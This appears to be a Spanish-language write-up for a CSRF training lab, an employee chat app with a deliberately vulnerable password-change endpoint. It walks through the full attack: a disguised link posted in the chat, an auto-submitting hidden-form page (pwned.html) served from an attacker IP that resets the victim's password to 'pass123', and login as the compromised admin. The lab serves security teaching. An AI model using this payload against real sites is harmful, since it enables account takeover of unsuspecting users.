## 🚨 Cross-Site Request Forgery (CSRF-Lab)
- Aplicación vulnerable a **Cross-Site Request Forgery (CSRF)**, un tipo de ataque que hace que un usuario realice acciones no deseadas dentro de una aplicación web que ya le ha otorgado autenticación.
- Se trata de una ataque que hace uso de la ingeniería social para conseguir que el usuario víctima en cuestión pinche en enlaces que conlleven acciones desafortunadas para él. Si además el usuario víctima tiene privilegios en el sitio web, las consecuencias pueden llegar a ser bastante más graves.
- En concreto, este laboratorio contempla un sistema de gestión de empleados en el que estos pueden intercambiar mensajes internos mediante un chat general. El vector de ataque está en que si un empleado malintencionado introduce un enlace malicioso en uno de los mensajes, otro usuario (víctima) puede clicar en él y realizar acciones involuntarias en el sistema.

Vector de ataque completo:

Inicio de sesión como el usuario "julian":

![Inicio de sesión como julian](images/julian.png)

Enlace malicioso escrito en el chat
```html
<a href="http://192.168.1.61/pwned.html" target="_blank">Horas trabajadas</a>
```

![Estructura del enlace malicioso](images/chat1.png)
![Enlace malicioso insertado](images/chat2.png)

Posteriormente, el atacante se pone en escucha por el puerto 80 mediante un servidor con python:

![Servidor HTTP en escucha](images/escucha.png)

Html malicioso del atacante (archivo pwned.html), disponible en el servidor del atacante:

```html
<!DOCTYPE html>
<html>
    <body>
        <form action="http://csrf-lab:5000/change-password" method="POST">
            <input type="hidden" name="new" value="pass123" />
        </form>
        <script>
            document.forms[0].submit();
            setTimeout(function() {
                window.location.href = 'http://192.168.1.60:5015/chat';
            }, 100);
        </script>
    </body>
</html>
```

Cuando la víctima pulse en el enlace del chat, esta será redirigida a este html malicioso hosteado por el atacante. Este html hará una petición de cambio de contraseña de la cuenta de la víctima y rápidamente redirigirá al usuario de nuevo al chat (pero su contraseña ya se habrá actualizado).

Después de una breve espera, observamos que un usuario ha clicado en el enlace malicioso (ha caido en la trampa):

![Recibo peticiones en el servidor](images/escucha2.png)

Probamos con todos los usuarios hasta que iniciamos sesión con el usuario admin (este fue el usuario víctima del ataque) con la nueva contraseña actualizada, "pass123". Como podemos observar, este usuarios es privilegiado en la web en relación con el resto (puede ejecutar operaciones adicionales de gestión de usuarios):

![Inicio de sesión como admin](images/admin.png)

Es importante destacar, que en este laboratorio se ha simulado que existe un administrador revisando los mensajes por detrás a través de un BOT con selenium. Básicamente está programado para que cada minuto acceda a la página del chat e interactue con los mensajes (como lo haría un usuario real en una web de estas características).
